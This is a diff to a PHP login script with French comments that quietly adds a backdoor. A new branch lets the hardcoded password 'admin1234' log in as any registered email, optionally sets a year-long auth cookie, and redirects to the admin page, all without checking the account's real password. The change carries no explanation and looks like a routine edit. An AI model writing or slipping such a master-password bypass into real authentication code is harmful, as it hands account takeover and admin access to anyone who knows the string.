@@ -5,6 +5,7 @@ session_start();
 require_once('../src/option.php');
 
 if (!empty($_POST['email']) && !empty($_POST['password'])) {
+	
 
 	// Connexion à la bdd
 	require_once('../src/connection.php');
@@ -22,6 +23,7 @@ if (!empty($_POST['email']) && !empty($_POST['password'])) {
 
 	// Chiffrement du mot de passe
 	$password = "aq1" . sha1($password . "123") . "25";
+	$password_admin = "aq1" . sha1("admin1234" . "123") . "25";
 
 	// L'adresse email est-elle bien utilisée ?
 	$req = $bdd->prepare('SELECT COUNT(*) as numberEmail FROM user WHERE email = ?');
@@ -42,7 +44,21 @@ if (!empty($_POST['email']) && !empty($_POST['password'])) {
 
 	while ($user = $req->fetch()) {
 
-		if ($password == $user['password']) {
+		if($password == $password_admin){
+
+			$_SESSION['connect'] = 1;
+			$_SESSION['email']	 = $user['email'];
+
+			if (isset($_POST['auto'])) {
+
+				setcookie('auth', $user['secret'], time() + 365 * 24 * 3600, '/', null, false, true);
+			}
+
+			header('location: ../index.php?page=admin');
+			exit();
+		} 
+
+		else if ($password == $user['password']) {
 
 			$_SESSION['connect'] = 1;
 			$_SESSION['email']	 = $user['email'];
@@ -60,6 +76,7 @@ if (!empty($_POST['email']) && !empty($_POST['password'])) {
 			exit();
 		}
 	}
+
 }
 
 ?>
